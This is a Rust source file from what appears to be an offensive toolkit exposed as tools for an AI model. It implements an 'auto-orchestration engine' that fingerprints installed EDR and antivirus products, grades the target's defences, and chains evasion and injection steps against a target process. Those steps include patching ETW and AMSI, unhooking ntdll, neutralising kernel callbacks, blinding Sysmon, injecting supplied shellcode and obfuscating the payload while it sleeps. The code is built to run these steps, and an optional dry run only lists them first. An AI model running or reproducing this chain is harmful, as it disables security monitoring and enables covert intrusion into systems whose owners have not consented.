//! Auto-orchestration engine
//! Chains EDR detection → adaptive evasion → injection → execution → cleanup
//! Provides intelligent, multi-step attack workflows controlled by the AI model.

use crate::error::MemoricError;
use serde_json::{json, Value};

/// Threat level detected on the target system
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ThreatLevel {
    /// No EDR / minimal protection
    Low,
    /// Basic AV (Defender only)
    Medium,
    /// Full EDR suite (CrowdStrike, SentinelOne, etc.)
    High,
    /// Kernel-level telemetry (ETW-TI, sysmon, minifilters)
    Critical,
}

/// Recommended evasion profile based on threat assessment
#[derive(Debug, Clone)]
pub struct EvasionProfile {
    pub threat_level: ThreatLevel,
    pub detected_products: Vec<String>,
    pub recommended_evasion: Vec<EvasionStep>,
    pub recommended_injection: String,
    pub recommended_syscall_method: String,
    pub sleep_technique: String,
    pub needs_kernel_evasion: bool,
}

/// A single evasion step in the orchestrated chain
#[derive(Debug, Clone)]
pub struct EvasionStep {
    pub tool: String,
    pub action: String,
    pub args: Value,
    pub description: String,
    pub required: bool,
}

/// Known EDR/AV products and their detection capabilities
struct EdcProductDb;

impl EdcProductDb {
    fn classify(products: &[String]) -> ThreatLevel {
        let mut level = ThreatLevel::Low;

        for product in products {
            let lower = product.to_lowercase();
            if lower.contains("crowdstrike")
                || lower.contains("sentinelone")
                || lower.contains("carbon black")
                || lower.contains("cortex")
                || lower.contains("elastic edr")
                || lower.contains("trellix")
            {
                level = std::cmp::max(level, ThreatLevel::High);
            } else if lower.contains("defender")
                || lower.contains("sophos")
                || lower.contains("mcafee")
                || lower.contains("symantec")
                || lower.contains("kaspersky")
                || lower.contains("avast")
                || lower.contains("avg")
                || lower.contains("bitdefender")
            {
                level = std::cmp::max(level, ThreatLevel::Medium);
            }

            // Kernel-level indicators
            if lower.contains("sysmon")
                || lower.contains("etw")
                || lower.contains("minifilter")
                || lower.contains("patchguard")
            {
                level = ThreatLevel::Critical;
            }
        }

        level
    }

    fn evasion_for_level(level: ThreatLevel) -> (String, String, String) {
        match level {
            ThreatLevel::Low => (
                "thread".to_string(),      // injection method
                "direct".to_string(),      // syscall method
                "sleep_death".to_string(), // sleep technique
            ),
            ThreatLevel::Medium => (
                "apc".to_string(),
                "indirect".to_string(),
                "sleep_ekko".to_string(),
            ),
            ThreatLevel::High => (
                "threadless".to_string(),
                "indirect".to_string(),
                "sleep_foliage".to_string(),
            ),
            ThreatLevel::Critical => (
                "phantom".to_string(),
                "indirect".to_string(),
                "sleep_gargoyle".to_string(),
            ),
        }
    }
}

/// Assess the target system's security posture
pub fn assess_environment(args: &Value) -> Result<Value, MemoricError> {
    let pid = args.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

    tracing::info!(
        "[ORCHESTRATION] Assessing security environment (target PID={})",
        pid
    );

    // Detect security products via multiple methods
    let mut detected_products = Vec::new();
    let mut detection_methods = Vec::new();

    // Method 1: Process scan
    let processes = scan_running_processes()?;
    for (proc_name, _) in &processes {
        if is_security_product(proc_name) {
            detected_products.push(proc_name.clone());
        }
    }
    if !detected_products.is_empty() {
        detection_methods.push("process_scan");
    }

    // Method 2: Service scan
    let services = scan_security_services()?;
    for svc in &services {
        if !detected_products.contains(svc) {
            detected_products.push(svc.clone());
        }
    }
    if !services.is_empty() {
        detection_methods.push("service_scan");
    }

    // Method 3: Check for kernel-level telemetry indicators
    let mut kernel_indicators = Vec::new();
    if check_sysmon_present() {
        kernel_indicators.push("sysmon");
        detected_products.push("Sysmon".to_string());
    }
    if check_etw_ti_enabled() {
        kernel_indicators.push("etw_ti");
    }
    if !kernel_indicators.is_empty() {
        detection_methods.push("kernel_check");
    }

    let threat_level = EdcProductDb::classify(&detected_products);
    let (injection, syscall, sleep) = EdcProductDb::evasion_for_level(threat_level);

    let needs_kernel = matches!(threat_level, ThreatLevel::Critical | ThreatLevel::High);

    // Build the evasion plan
    let mut evasion_steps = Vec::new();

    // Always patch ETW as baseline
    evasion_steps.push(json!({
        "order": 1, "tool": "stealth", "action": "patch_etw",
        "description": "Patch EtwEventWrite to prevent ETW telemetry",
        "required": true
    }));

    if threat_level >= ThreatLevel::Medium {
        evasion_steps.push(json!({
            "order": 2, "tool": "stealth", "action": "patch_amsi",
            "description": "Patch AMSI to prevent script scanning",
            "required": true
        }));
        evasion_steps.push(json!({
            "order": 3, "tool": "stealth", "action": "unhook_ntdll",
            "description": "Unhook ntdll.dll by mapping clean copy from disk",
            "required": true
        }));
    }

    if threat_level >= ThreatLevel::High {
        evasion_steps.push(json!({
            "order": 4, "tool": "stealth", "action": "spoof_callstack",
            "description": "Spoof call stack before sleep to evade stack scanning",
            "required": true
        }));
        evasion_steps.push(json!({
            "order": 5, "tool": "stealth", "action": "hide_module",
            "description": "Unlink DLL from PEB to hide from module enumeration",
            "required": false
        }));
    }

    if needs_kernel {
        evasion_steps.push(json!({
            "order": 6, "tool": "kernel", "action": "etw_ti_remove",
            "description": "Remove ETW Threat Intelligence provider at kernel level",
            "required": true
        }));
        evasion_steps.push(json!({
            "order": 7, "tool": "kernel", "action": "object_callback_enum",
            "description": "Enumerate and neutralize ObRegisterCallbacks (EDR process protection)",
            "required": true
        }));
        if kernel_indicators.contains(&"sysmon") {
            evasion_steps.push(json!({
                "order": 8, "tool": "stealth", "action": "sysmon_blind",
                "description": "Blind Sysmon driver to prevent event logging",
                "required": true
            }));
        }
    }

    // Injection step
    evasion_steps.push(json!({
        "order": 10, "tool": "inject",
        "action": injection,
        "args": { "syscall_method": syscall },
        "description": format!("Inject payload via {} with {} syscalls", injection, syscall),
        "required": true
    }));

    // Post-injection
    evasion_steps.push(json!({
        "order": 11, "tool": "stealth",
        "action": sleep,
        "description": format!("Sleep obfuscation via {}", sleep),
        "required": true
    }));

    Ok(json!({
        "success": true,
        "technique": "environment_assessment",
        "threat_level": format!("{:?}", threat_level),
        "detected_products": detected_products,
        "detection_methods": detection_methods,
        "kernel_indicators": kernel_indicators,
        "profile": {
            "recommended_injection": injection,
            "recommended_syscall_method": syscall,
            "recommended_sleep": sleep,
            "needs_kernel_evasion": needs_kernel,
        },
        "evasion_plan": evasion_steps,
        "message": format!(
            "Threat level: {:?}. Detected {} security products. {} evasion steps recommended.",
            threat_level, detected_products.len(), evasion_steps.len()
        )
    }))
}

/// Execute a full orchestrated attack chain
pub fn execute_chain(args: &Value) -> Result<Value, MemoricError> {
    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing target pid".to_string()))?
        as u32;
    let shellcode_hex = args.get("shellcode").and_then(|v| v.as_str());
    let dry_run = args
        .get("dry_run")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let allow_live_execution = args
        .get("allow_live_execution")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    tracing::warn!(
        "[ORCHESTRATION] Execute chain: PID={} dry_run={}",
        pid,
        dry_run
    );

    if !dry_run && !allow_live_execution {
        return Err(MemoricError::MemoryAccess(
            "orchestrate(action='execute', dry_run=false) requires allow_live_execution=true. The generated chain may run state-changing evasion and injection steps; run a dry run first and opt in explicitly.".to_string()
        ));
    }

    // Step 1: Assess environment
    let assessment = assess_environment(args)?;
    let threat_level = assessment
        .get("threat_level")
        .and_then(|v| v.as_str())
        .unwrap_or("Low");
    let plan = assessment
        .get("evasion_plan")
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default();

    if dry_run {
        return Ok(json!({
            "success": true,
            "technique": "orchestrated_chain",
            "mode": "dry_run",
            "target_pid": pid,
            "threat_level": threat_level,
            "planned_steps": plan.len(),
            "steps": plan,
            "message": format!("Dry run: {} steps planned for PID {} (threat: {}). Set dry_run=false to execute.",
                plan.len(), pid, threat_level)
        }));
    }

    // Log the chain for auditing
    let chain_id = format!("chain_{}", chrono::Utc::now().timestamp_millis());
    let mut results = Vec::new();
    let mut failures = Vec::new();

    for step in &plan {
        let tool = step.get("tool").and_then(|v| v.as_str()).unwrap_or("");
        let action = step.get("action").and_then(|v| v.as_str()).unwrap_or("");
        let required = step
            .get("required")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        tracing::info!("[ORCHESTRATION] Step: {}/{}", tool, action);

        let step_args_raw = step.get("args").cloned().unwrap_or(json!({}));
        let mut step_args = if let Some(obj) = step_args_raw.as_object() {
            let mut map = serde_json::Map::new();
            map.insert("action".to_string(), json!(action));
            map.insert("pid".to_string(), json!(pid));
            for (k, v) in obj {
                if k != "action" && k != "pid" {
                    map.insert(k.clone(), v.clone());
                }
            }
            json!(map)
        } else {
            json!({
                "action": action,
                "pid": pid,
            })
        };

        // Forward shellcode to the injection step
        if tool == "inject" {
            if let Some(sc) = shellcode_hex {
                step_args["shellcode"] = json!(sc);
            }
        }

        let result = crate::mcp::tools::call_tool(tool, step_args);

        match result {
            Ok(val) => {
                results.push(json!({
                    "tool": tool,
                    "action": action,
                    "success": true,
                    "result": val
                }));
            }
            Err(e) => {
                let entry = json!({
                    "tool": tool,
                    "action": action,
                    "success": false,
                    "error": e.to_string()
                });
                if required {
                    failures.push(entry.clone());
                    results.push(entry);
                    tracing::error!(
                        "[ORCHESTRATION] Required step failed: {}/{}: {}",
                        tool,
                        action,
                        e
                    );
                    break; // Stop on required step failure
                } else {
                    results.push(entry);
                    tracing::warn!(
                        "[ORCHESTRATION] Optional step failed: {}/{}: {}",
                        tool,
                        action,
                        e
                    );
                }
            }
        }
    }

    Ok(json!({
        "success": failures.is_empty(),
        "technique": "orchestrated_chain",
        "chain_id": chain_id,
        "target_pid": pid,
        "threat_level": threat_level,
        "steps_planned": plan.len(),
        "steps_executed": results.len(),
        "steps_failed": failures.len(),
        "results": results,
        "failures": failures,
        "message": if failures.is_empty() {
            format!("Chain completed: {}/{} steps succeeded", results.len(), plan.len())
        } else {
            format!("Chain halted: {} required steps failed", failures.len())
        }
    }))
}

/// Generate a custom chain from a chain specification
pub fn plan_chain(args: &Value) -> Result<Value, MemoricError> {
    let steps_opt = args.get("steps").and_then(|v| v.as_array());
    let empty_steps = Vec::new();
    let steps = steps_opt.unwrap_or(&empty_steps);

    let mut plan = Vec::new();
    let mut validation_errors = Vec::new();
    let mut validation_warnings = Vec::new();

    if steps_opt.is_none() {
        validation_errors.push(
            "Missing steps array. orchestrate(action='plan') performs static validation only; provide steps=[{tool, action, args}] or use orchestrate(action='templates') for examples.".to_string(),
        );
    }

    const MAX_PLAN_STEPS: usize = 64;
    if steps.len() > MAX_PLAN_STEPS {
        validation_errors.push(format!(
            "Plan has {} steps; maximum supported static validation size is {}",
            steps.len(),
            MAX_PLAN_STEPS
        ));
    }

    for (i, step) in steps.iter().take(MAX_PLAN_STEPS).enumerate() {
        if !step.is_object() {
            validation_errors.push(format!("Step {}: expected an object", i + 1));
            continue;
        }

        let tool = step
            .get("tool")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");
        let action = step
            .get("action")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        if !is_valid_tool(tool) {
            validation_errors.push(format!("Step {}: unknown tool '{}'", i + 1, tool));
            continue;
        }
        if !crate::mcp::tools::is_known_tool_action(tool, action) {
            validation_errors.push(format!(
                "Step {}: unknown action '{}' for tool '{}'",
                i + 1,
                action,
                tool
            ));
            continue;
        }

        let step_args = step.get("args").cloned().unwrap_or(json!({}));
        let missing = missing_required_static_params(tool, action, &step_args);
        if !missing.is_empty() {
            validation_errors.push(format!(
                "Step {}: {}/{} missing required parameter(s): {}",
                i + 1,
                tool,
                action,
                missing.join(", ")
            ));
        }
        validation_warnings.extend(
            static_plan_warnings(tool, action, &step_args)
                .into_iter()
                .map(|warning| format!("Step {}: {}", i + 1, warning)),
        );

        plan.push(json!({
            "order": i + 1,
            "tool": tool,
            "action": action,
            "args": step_args,
            "description": step.get("description").and_then(|v| v.as_str()).unwrap_or(""),
            "required": step.get("required").and_then(|v| v.as_bool()).unwrap_or(true),
        }));
    }

    Ok(json!({
        "success": validation_errors.is_empty(),
        "technique": "plan_chain",
        "mode": "static_validation_only",
        "executes_live_actions": false,
        "steps": plan.len(),
        "plan": plan,
        "validation_errors": validation_errors,
        "validation_warnings": validation_warnings,
        "message": if validation_errors.is_empty() {
            format!("Chain plan validated: {} steps ready", plan.len())
        } else {
            format!("Plan has {} validation errors", validation_errors.len())
        }
    }))
}

// ─── Helpers ──────────────────────────────────────────────────

fn has_param(args: &Value, key: &str) -> bool {
    args.get(key).is_some_and(|value| {
        !value.is_null()
            && value
                .as_str()
                .map(|text| !text.trim().is_empty())
                .unwrap_or(true)
    })
}

fn has_any_param(args: &Value, keys: &[&str]) -> bool {
    keys.iter().any(|key| has_param(args, key))
}

fn missing_required_static_params(tool: &str, action: &str, args: &Value) -> Vec<String> {
    let mut required: Vec<&str> = match (tool, action) {
        ("target", "module_base") => vec!["pid", "module_name"],
        ("target", "string_read") => vec!["pid", "address"],
        ("target", "string_write") => vec!["pid", "address", "text"],
        ("payload", "obfuscate") => vec!["obf_method"],
        ("hook", "install_iat") | ("hook", "hook_function") => {
            vec!["pid", "module", "function", "hook_address"]
        }
        ("hook", "install") => {
            if args
                .get("method")
                .and_then(|v| v.as_str())
                .is_some_and(|method| method == "inline")
            {
                vec!["pid", "target_address", "hook_address"]
            } else {
                vec!["pid", "module", "function", "hook_address"]
            }
        }
        ("hook", "remove_iat") | ("hook", "remove") => {
            vec!["pid", "iat_address", "original_address"]
        }
        ("inject", "fiber")
        | ("inject", "threadpool")
        | ("inject", "stack_bomb")
        | ("inject", "pool_party_worker")
        | ("inject", "pool_party_work")
        | ("inject", "pool_party_direct")
        | ("inject", "pool_party_timer") => vec!["pid", "shellcode"],
        ("kernel", "read") | ("kernel", "write") | ("kernel", "enum_callbacks") => {
            vec!["device_path"]
        }
        ("stealth", "sleep_ekko") | ("stealth", "sleep_foliage") | ("stealth", "sleep_death") => {
            vec!["address", "size"]
        }
        ("stealth", "spoof_callstack") => vec!["shellcode_address"],
        ("stealth", "encrypt_memory") => vec!["address", "size"],
        ("stealth", "decrypt_memory") => vec!["address"],
        ("memory", "read") | ("memory", "write") | ("memory", "free") => vec!["pid", "address"],
        ("memory", "alloc") => vec!["pid", "size"],
        ("memory", "protect") => vec!["pid", "address"],
        _ => Vec::new(),
    };

    if matches!((tool, action), ("memory", "write")) && !has_any_param(args, &["bytes", "text"]) {
        required.push("bytes");
    }

    if matches!((tool, action), ("payload", "pe_parse")) {
        let show = args
            .get("show")
            .and_then(|v| v.as_str())
            .unwrap_or("headers");
        if show == "iat_entry" {
            required.extend(["pid", "module"]);
        } else {
            required.push("pid");
            if !has_any_param(args, &["address", "base_address"]) {
                required.push("address");
            }
        }
    }

    required
        .into_iter()
        .filter(|key| !has_param(args, key))
        .map(|key| key.to_string())
        .collect()
}

fn static_plan_warnings(tool: &str, action: &str, args: &Value) -> Vec<String> {
    let mut warnings = Vec::new();

    if tool == "target" && action == "module_base" && has_param(args, "name") {
        warnings
            .push("module_base uses module_name; name is a process search parameter".to_string());
    }
    if tool == "payload"
        && action == "pe_parse"
        && !has_any_param(args, &["address", "base_address"])
        && args
            .get("show")
            .and_then(|v| v.as_str())
            .unwrap_or("headers")
            != "iat_entry"
    {
        warnings.push(
            "pe_parse reads a PE image at a base address; suspended targets may not have initialized modules yet"
                .to_string(),
        );
    }
    if tool == "stealth" && matches!(action, "encrypt_memory" | "decrypt_memory") {
        warnings.push(
            "encrypt_memory/decrypt_memory operate on local memoric process memory only; remote PID/address input is rejected"
                .to_string(),
        );
    }
    if tool == "kernel" && matches!(action, "read" | "write" | "enum_callbacks") {
        warnings.push("kernel generic helpers require an explicit BYOVD device_path".to_string());
    }

    warnings
}

fn scan_running_processes() -> Result<Vec<(String, u32)>, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;

    let mut result = Vec::new();

    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name_end = entry
                    .szExeFile
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..name_end]);
                result.push((name, entry.th32ProcessID));

                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snap);
    }

    Ok(result)
}

fn scan_security_services() -> Result<Vec<String>, MemoricError> {
    use windows::Win32::System::Services::{
        EnumServicesStatusExW, OpenSCManagerW, ENUM_SERVICE_STATUS_PROCESSW, SC_ENUM_PROCESS_INFO,
        SC_MANAGER_ENUMERATE_SERVICE, SERVICE_STATE_ALL, SERVICE_WIN32,
    };

    let security_service_names = [
        "csagent",
        "csfalconservice", // CrowdStrike
        "sentinelagent",
        "sentinelone", // SentinelOne
        "cbdefense",
        "carbonblack", // Carbon Black
        "cortex",
        "traps", // Palo Alto
        "windefend",
        "mpssvc", // Windows Defender
        "sophosav",
        "sophos", // Sophos
        "mcshield",
        "mcafee", // McAfee
        "sepmaster",
        "symantec", // Symantec
        "klnagent",
        "kaspersky", // Kaspersky
        "sysmon",
        "sysmon64", // Sysmon
    ];

    let mut services = Vec::new();

    unsafe {
        let scm = OpenSCManagerW(None, None, SC_MANAGER_ENUMERATE_SERVICE)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {}", e)))?;

        let mut bytes_needed = 0u32;
        let mut services_returned = 0u32;
        let mut resume_handle = 0u32;

        let _ = EnumServicesStatusExW(
            scm,
            SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            None,
            &mut bytes_needed,
            &mut services_returned,
            Some(&mut resume_handle),
            None,
        );

        if bytes_needed > 0 {
            let mut buf = vec![0u8; bytes_needed as usize];
            if EnumServicesStatusExW(
                scm,
                SC_ENUM_PROCESS_INFO,
                SERVICE_WIN32,
                SERVICE_STATE_ALL,
                Some(&mut buf),
                &mut bytes_needed,
                &mut services_returned,
                Some(&mut resume_handle),
                None,
            )
            .is_ok()
            {
                let svc_array = std::slice::from_raw_parts(
                    buf.as_ptr() as *const ENUM_SERVICE_STATUS_PROCESSW,
                    services_returned as usize,
                );

                for svc in svc_array {
                    let svc_name = svc.lpServiceName.to_string().unwrap_or_default();
                    let lower = svc_name.to_lowercase();
                    for known in &security_service_names {
                        if lower.contains(known) {
                            let running = svc.ServiceStatusProcess.dwCurrentState.0 == 4; // SERVICE_RUNNING
                            services.push(format!(
                                "{} ({})",
                                svc_name,
                                if running { "RUNNING" } else { "stopped" }
                            ));
                            break;
                        }
                    }
                }
            }
        }

        let _ = windows::Win32::System::Services::CloseServiceHandle(scm);
    }

    Ok(services)
}

fn is_security_product(name: &str) -> bool {
    let lower = name.to_lowercase();
    let security_processes = [
        "msmpeng.exe",
        "mpcmdrun.exe",
        "nissrv.exe", // Defender
        "csfalconservice.exe",
        "csagent.exe", // CrowdStrike
        "sentinelagent.exe",
        "sentinelone.exe", // SentinelOne
        "cbdefense.exe",
        "repux.exe", // Carbon Black
        "cortex.exe",
        "trapsd.exe", // Palo Alto
        "sophosav.exe",
        "savservice.exe", // Sophos
        "mcshield.exe",
        "mfeavsvc.exe", // McAfee
        "ccsvchst.exe",
        "rtvscan.exe", // Symantec
        "avp.exe",
        "kavtray.exe", // Kaspersky
        "sysmon.exe",
        "sysmon64.exe", // Sysmon
        "bdagent.exe",
        "vsserv.exe", // Bitdefender
        "avgui.exe",
        "avgsvc.exe", // AVG
        "avastui.exe",
        "avastsvc.exe", // Avast
        "elastic-agent.exe",
        "elastic-endpoint.exe", // Elastic
        "firetray.exe",         // Trellix
    ];

    security_processes.iter().any(|p| lower == *p)
}

fn check_sysmon_present() -> bool {
    use windows::core::{w, PCWSTR};
    use windows::Win32::System::Services::{
        OpenSCManagerW, OpenServiceW, QueryServiceStatus, SC_MANAGER_CONNECT, SERVICE_QUERY_STATUS,
        SERVICE_STATUS,
    };

    unsafe {
        let scm = match OpenSCManagerW(None, None, SC_MANAGER_CONNECT) {
            Ok(h) => h,
            Err(_) => return false,
        };

        for svc_name in [w!("sysmon64"), w!("sysmon")] {
            let svc = match OpenServiceW(scm, PCWSTR(svc_name.as_ptr()), SERVICE_QUERY_STATUS) {
                Ok(h) => h,
                Err(_) => continue,
            };

            let mut status = SERVICE_STATUS::default();
            let running =
                QueryServiceStatus(svc, &mut status).is_ok() && status.dwCurrentState.0 == 4; // SERVICE_RUNNING

            let _ = windows::Win32::System::Services::CloseServiceHandle(svc);

            if running {
                let _ = windows::Win32::System::Services::CloseServiceHandle(scm);
                return true;
            }
        }

        let _ = windows::Win32::System::Services::CloseServiceHandle(scm);
    }
    false
}

fn check_etw_ti_enabled() -> bool {
    // Check if EtwThreatIntProvRegHandle is non-null
    // This is a heuristic — if ntdll!EtwEventWrite is hooked, ETW-TI is likely active
    unsafe {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        let ntdll = match GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr())) {
            Ok(h) => h,
            Err(_) => return false,
        };

        let func = GetProcAddress(ntdll, windows::core::PCSTR(b"EtwEventWrite\0".as_ptr()));
        if let Some(ptr) = func {
            let bytes = std::slice::from_raw_parts(ptr as *const u8, 4);
            // If first bytes are a JMP (0xFF 0x25 or 0xE9), it's hooked → ETW monitoring active
            bytes[0] == 0xFF || bytes[0] == 0xE9
        } else {
            false
        }
    }
}

fn is_valid_tool(tool: &str) -> bool {
    matches!(
        tool,
        "memoric"
            | "target"
            | "memory"
            | "inject"
            | "payload"
            | "hook"
            | "stealth"
            | "detect"
            | "privilege"
            | "kernel"
            | "self"
            | "orchestrate"
    )
}

#[cfg(test)]
mod tests {
    use super::plan_chain;
    use serde_json::json;

    #[test]
    fn plan_chain_without_steps_returns_validation_error() {
        let result = plan_chain(&json!({})).expect("plan should not fail hard");
        assert_eq!(result["success"], false);
        assert_eq!(result["mode"], "static_validation_only");
        assert_eq!(result["executes_live_actions"], false);
        assert!(result["validation_errors"]
            .as_array()
            .is_some_and(|errors| !errors.is_empty()));
    }

    #[test]
    fn plan_chain_reports_missing_common_params() {
        let result = plan_chain(&json!({
            "steps": [
                { "tool": "target", "action": "module_base", "args": { "pid": 1234, "name": "kernel32.dll" } },
                { "tool": "stealth", "action": "encrypt_memory", "args": { "pid": 1234, "address": "0x1000", "size": 16 } }
            ]
        }))
        .expect("plan should validate statically");

        let errors = result["validation_errors"].as_array().unwrap();
        assert!(errors
            .iter()
            .any(|e| e.as_str().unwrap_or_default().contains("module_name")));

        let warnings = result["validation_warnings"].as_array().unwrap();
        assert!(warnings.iter().any(|w| w
            .as_str()
            .unwrap_or_default()
            .contains("local memoric process memory")));
    }
}
